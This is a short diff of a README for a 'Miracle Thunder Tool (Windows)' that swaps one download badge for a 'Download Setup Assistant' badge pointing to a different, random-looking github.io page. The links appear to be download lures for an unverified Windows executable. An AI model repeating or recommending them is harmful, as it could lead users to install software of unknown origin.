@@ -1,13 +1,7 @@
 
 <h1 align="center">⚡ Miracle Thunder Tool (Windows)</h1>
 
-<p align="center">
-  <a href="https://miracle-thunder-free-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Miracle%20Thunder%20Tool-Windows%20Version-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download Miracle Thunder Tool for Windows" 
-         style="width: 540px; height: 43px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://ktlilm4rimo.github.io/.github/miracle-thunder)
 
 ---
 
